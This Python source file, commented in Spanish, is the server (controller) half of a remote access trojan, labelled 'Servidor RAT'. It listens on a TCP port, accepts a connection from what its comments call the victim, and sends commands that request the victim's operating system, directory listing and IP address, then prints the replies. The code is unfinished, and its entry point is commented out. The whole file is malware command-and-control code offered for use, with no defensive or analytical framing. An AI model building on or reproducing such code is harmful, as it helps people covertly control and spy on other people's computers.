# Servidor RAT

'''
	NOTA:
		Para el servidor es necesario solucionar problemas con los comandos aceptados.
'''

import socket
import sys
import time


class Servidor():
	# Constructor...
	def __init__(self, host, puerto):
		# Datos config serv
		self._HOST = host # '127.0.0.1'
		self._PUERTO = int(puerto) # 5322
		self._IPV4_CON = socket.AF_INET
		self._TCP_CON = socket.SOCK_STREAM
		self._CODIF = 'utf-8'

		# Configuracion de comandos:
		self._lista_comandos = [
			'salir',
			'obtener'
		]
		
		# lista para comando obtener
		self._opt_obt = [
			'os',
			'dir',
			'ip'
		]


	# Metodos...
	# Recibe y procesa el comando ingresado
	def procesar_comando(self, socket_cli) -> bool:
		val_bool = True
		while True:
			# Ingreso de comando:
			comando = input(f"[ cmd ] > ")
			comando_div = comando.split() # Divimos al comando en una lista
								
			# Seccion de comandos:
			if comando_div[0] in self._lista_comandos:
				# Salir
				if comando_div[0] == self._lista_comandos[0]:
					socket_cli.send("\0".encode(self._CODIF)) # Revisar este apartado, funciona pero no entiendo por qué xd
					val_bool = not val_bool
					break
				# Obtener
				elif comando_div[0] == self._lista_comandos[1]:
					if comando_div[1] in self._opt_obt:
						socket_cli.send(comando_div[1].encode(self._CODIF))
						break
				else:
					print(f" [*] Opcion {comando_div[1]} no valida!\n")
			else:
				print(f" [*] {comando} no es reconocido como comando valido!\n")
		return val_bool


	# Levantar servidor con la configuracion
	def levantar_servidor(self):
		try:
			print(f" [*] Iniciando servidor...\n")
			time.sleep(2)

			# Configuracion y espera de conexiones entrantes
			with socket.socket(self._IPV4_CON, self._TCP_CON) as s_serv:
				s_serv.bind((self._HOST, self._PUERTO)) # Parseo de ip y puerto
				s_serv.listen() # Establecer en modo escucha
				print(f" [*] Esperando cliente...\n")
				(S_CLI, IP_CLI) = s_serv.accept() # Aceptacion de peticiones de cli
				
				# Conexion establecida (en linea)
				en_linea = True

				# Informacion de OS victima
				#os_vict = S_CLI.recv(1024).decode(self._CODIF) # ESTO RECIBIA LA TRANSMISION DE LA LINEA 45 DEL CLIENTE LPMQMP! (la transmision de datos quedaba desfazada)

				# Con conexion aceptada
				with S_CLI:
					print(f" [*] Conexión establecida con [{IP_CLI[0]}] desde puerto [{IP_CLI[1]}]!\n")

					# Bucle principal (recibir, procesar, enviar)
					while en_linea:
						en_linea = self.procesar_comando(S_CLI)
						
						# NO TOCAR MOMENTANEAMENTE!!!
						'''
						while True:
							# Ingreso de comando:
							comando = input(f"[ cmd ] > ")
							#comando = input(f"[ {os_vict} ] > ")
							comando_div = comando.split() # Divimos al comando en una lista
							
							# Seccion de comandos:
							if comando_div[0] in self._lista_comandos:
								# Salir
								if comando_div[0] == self._lista_comandos[0]:
									S_CLI.send("\0".encode(self._CODIF)) # Revisar este apartado, funciona pero no entiendo por qué xd
									en_linea = not en_linea
									break
								# Obtener
								elif comando_div[0] == self._lista_comandos[1]:
									if comando_div[1] in self._opt_obt:
										S_CLI.send(comando_div[1].encode(self._CODIF))
										break
									else:
										print(f" [*] Opcion {comando_div[1]} no valida!\n")
							else:
								print(f" [*] {comando} no es reconocido como comando valido!\n")
						'''

						print(f" [*] Comando enviado...\n")

						# Recepcion de datos del cliente
						data = S_CLI.recv(1024)
						
						if data:
							if data == "\0".encode(self._CODIF):
								en_linea = not en_linea
								print(f" [*] Cliente desconectado :'( \n")
							print(f"{data.decode(self._CODIF)}")
						
						# Sin datos o datos de finalizacion de conexión
						else:
							break
						
			print(f" [*] Conexión finalizada.\n")

		except KeyboardInterrupt:
			print(f"\n [*] Conexión interrumpida o fallida :'( \n")


'''
# (DEBUG MODE)
# Ejecucion principal
if __name__ == '__main__':
	try:
		servidor = Servidor(sys.argv[1], sys.argv[2])
	except:
		print(" [*] Ingrese una direccion ip y un puerto para el sevidor.\n")
		sys.exit()

	# print("(Debug) Pasa...\n")
	servidor.levantar_servidor()
'''
